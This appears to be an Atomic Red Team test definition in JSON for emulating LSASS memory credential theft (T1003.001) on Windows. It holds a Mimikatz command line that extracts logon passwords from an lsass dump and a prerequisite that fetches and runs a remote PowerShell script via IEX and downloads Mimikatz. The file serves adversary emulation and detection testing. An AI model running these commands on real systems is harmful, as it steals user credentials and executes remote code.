{
    "name": "Offline Credential Theft With Mimikatz",
    "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands. ",
    "supported_platforms": [
        "windows"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
        "name": "command_prompt",
        "elevation_required": true,
        "type": "Command Executor"
    },
    "id": "T1003.001",
    "tactics": [
        "Credential Access"
    ],
    "technique": "LSASS Memory",
    "source": "ART",
    "uuid": "453acf13-1dbd-47d7-b28a-172ce9228023",
    "arguments": {
        "input_file": {
            "description": "Path of the Lsass dump",
            "type": "path",
            "default": "%tmp%\\lsass.DMP"
        },
        "mimikatz_exe": {
            "description": "Path of the Mimikatz binary",
            "type": "string",
            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
        }
    },
    "preconditions": [
        {
            "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
            "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        },
        {
            "description": "Lsass dump must exist at specified location (#{input_file})\n",
            "prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
            "get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}